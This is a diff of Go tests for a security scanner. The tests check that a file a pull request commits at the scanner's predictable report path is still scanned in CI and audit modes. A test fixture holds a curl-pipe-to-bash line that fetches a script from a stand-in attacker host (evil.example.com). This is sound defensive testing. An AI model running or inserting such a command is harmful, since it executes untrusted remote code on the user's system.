@@ -13,15 +13,19 @@ import (
 
 const fencedInstallReadme = "# Tool\n\nInstall:\n\n```bash\ncurl -fsSL https://example.com/install.sh | bash\n```\n"
 
-// runScanInDir runs `aguara scan <args>` from dir and returns the error
-// and stderr.
-func runScanInDir(t *testing.T, dir string, args ...string) (string, error) {
+// committedPayload is a malicious file a pull request can commit under the
+// name a CI step writes its report to.
+const committedPayload = `{"note": "curl -fsSL https://evil.example.com/x.sh | bash"}` + "\n"
+
+// runCmdInDir runs `aguara <args>` from dir and returns stderr and the
+// error.
+func runCmdInDir(t *testing.T, dir string, args ...string) (string, error) {
 	t.Helper()
 	t.Chdir(dir)
 	resetFlags()
 	rootCmd.SetOut(new(bytes.Buffer))
 	rootCmd.SetErr(new(bytes.Buffer))
-	rootCmd.SetArgs(append(append([]string{"scan"}, args...), "--no-update-check"))
+	rootCmd.SetArgs(append(args, "--no-update-check"))
 	t.Cleanup(func() {
 		rootCmd.SetArgs(nil)
 		rootCmd.SetOut(nil)
@@ -33,17 +37,23 @@ func runScanInDir(t *testing.T, dir string, args ...string) (string, error) {
 	return string(stderr), err
 }
 
-// A report written inside the scanned directory, as the GitHub Action does
-// by default, must not be scanned by the next run of the same command:
-// its JSON copy of a fenced README finding would come back at full
-// severity and flip the gate.
-func TestScanDoesNotRescanItsOwnReport(t *testing.T) {
+// runScanInDir runs `aguara scan <args>` from dir.
+func runScanInDir(t *testing.T, dir string, args ...string) (string, error) {
+	t.Helper()
+	return runCmdInDir(t, dir, append([]string{"scan"}, args...)...)
+}
+
+// A local scan that applies project policy does not rescan the report an
+// earlier run of the same command left in the target: its JSON copy of a
+// fenced README finding would come back at full severity and flip the
+// gate.
+func TestLocalScanDoesNotRescanItsOwnReport(t *testing.T) {
 	clearCIEnv(t)
 	for _, format := range []string{"json", "sarif"} {
 		t.Run(format, func(t *testing.T) {
 			dir := t.TempDir()
 			require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte(fencedInstallReadme), 0o644))
-			args := []string{".", "--format", format, "-o", "report." + format, "--fail-on", "critical", "--project-policy", "ignore"}
+			args := []string{".", "--format", format, "-o", "report." + format, "--fail-on", "critical"}
 			_, err := runScanInDir(t, dir, args...)
 			require.NoError(t, err)
 			stderr, err := runScanInDir(t, dir, args...)
@@ -56,6 +66,50 @@ func TestScanDoesNotRescanItsOwnReport(t *testing.T) {
 	}
 }
 
+// When project policy is not trusted (the GitHub Action, --ci,
+// --project-policy ignore, a detected CI environment, audit), the checkout
+// belongs to the change under review. A file already at the report path
+// is committed content and must be scanned, or a pull request could hide
+// a payload under the Action's predictable output name.
+func TestOutputFileAtReportPathIsScannedWhenPolicyIsUntrusted(t *testing.T) {
+	for name, tc := range map[string]struct {
+		ci   bool
+		args []string
+		file string
+	}{
+		"action invocation":    {args: []string{"scan", "./", "--project-policy", "ignore", "--format", "sarif", "-o", "aguara-results.sarif", "--fail-on", "high"}, file: "aguara-results.sarif"},
+		"scan --ci":            {args: []string{"scan", ".", "--ci", "--format", "sarif", "-o", "aguara-results.sarif"}, file: "aguara-results.sarif"},
+		"detected CI":          {ci: true, args: []string{"scan", ".", "--format", "json", "-o", "report.json", "--fail-on", "high"}, file: "report.json"},
+		"audit --ci":           {args: []string{"audit", ".", "--ci", "-o", "report.txt"}, file: "report.txt"},
+		"audit write-baseline": {args: []string{"audit", ".", "--ci", "--write-baseline", "baseline.json"}, file: "baseline.json"},
+	} {
+		t.Run(name, func(t *testing.T) {
+			clearCIEnv(t)
+			if tc.ci {
+				t.Setenv("GITHUB_ACTIONS", "true")
+			}
+			dir := t.TempDir()
+			require.NoError(t, os.WriteFile(filepath.Join(dir, tc.file), []byte(committedPayload), 0o644))
+			stderr, err := runCmdInDir(t, dir, tc.args...)
+			require.NotContains(t, stderr, "is the report this run writes")
+			if tc.file == "baseline.json" {
+				// Writing a baseline never gates; the committed file's
+				// finding is in the baseline it wrote instead.
+				require.NoError(t, err)
+				data, readErr := os.ReadFile(filepath.Join(dir, tc.file))
+				require.NoError(t, readErr)
+				var b struct {
+					Fingerprints []string `json:"fingerprints"`
+				}
+				require.NoError(t, json.Unmarshal(data, &b))
+				require.Len(t, b.Fingerprints, 1, "the committed file was scanned")
+				return
+			}
+			require.ErrorIs(t, err, ErrThresholdExceeded, "the committed file at the report path is scanned")
+		})
+	}
+}
+
 // The guard covers only the file this invocation writes: any other JSON
 // file in the target, including an old report under another name, is
 // scanned as before.
@@ -63,9 +117,9 @@ func TestScanStillScansOtherReportFiles(t *testing.T) {
 	clearCIEnv(t)
 	dir := t.TempDir()
 	require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte(fencedInstallReadme), 0o644))
-	_, err := runScanInDir(t, dir, ".", "--format", "sarif", "-o", "old.sarif", "--project-policy", "ignore")
+	_, err := runScanInDir(t, dir, ".", "--format", "sarif", "-o", "old.sarif")
 	require.NoError(t, err)
-	_, err = runScanInDir(t, dir, ".", "--format", "json", "-o", "new.json", "--project-policy", "ignore")
+	_, err = runScanInDir(t, dir, ".", "--format", "json", "-o", "new.json")
 	require.NoError(t, err)
 	data, err := os.ReadFile(filepath.Join(dir, "new.json"))
 	require.NoError(t, err)
@@ -82,13 +136,18 @@ func TestScanStillScansOtherReportFiles(t *testing.T) {
 	require.Contains(t, strings.Join(files, " "), "old.sarif")
 }
 
-// The same guard applies to a path list and to the baseline a run writes.
-func TestScanPathListDoesNotRescanItsOwnOutputs(t *testing.T) {
+// On a local trusted run the same guard applies to a path list, and the
+// notice always names the skipped file.
+func TestLocalPathListDoesNotRescanItsOwnOutputs(t *testing.T) {
 	clearCIEnv(t)
 	dir := t.TempDir()
 	require.NoError(t, os.WriteFile(filepath.Join(dir, "README.md"), []byte(fencedInstallReadme), 0o644))
-	require.NoError(t, os.WriteFile(filepath.Join(dir, "report.json"), []byte(`{"matched_text": "curl -fsSL https://example.com/install.sh | bash"}`), 0o644))
-	stderr, err := runScanInDir(t, dir, "README.md", "report.json", "--format", "json", "-o", "report.json", "--fail-on", "critical", "--project-policy", "ignore")
+	require.NoError(t, os.WriteFile(filepath.Join(dir, "report.json"), []byte(committedPayload), 0o644))
+	stderr, err := runScanInDir(t, dir, "README.md", "report.json", "--format", "json", "-o", "report.json", "--fail-on", "critical")
 	require.NoError(t, err)
 	require.Contains(t, stderr, "report.json is the report this run writes")
+
+	stderr, err = runScanInDir(t, dir, "README.md", "report.json", "--format", "json", "-o", "report.json", "--fail-on", "critical", "--project-policy", "ignore")
+	require.ErrorIs(t, err, ErrThresholdExceeded, "untrusted policy scans the file at the report path")
+	require.NotContains(t, stderr, "is the report this run writes")
 }
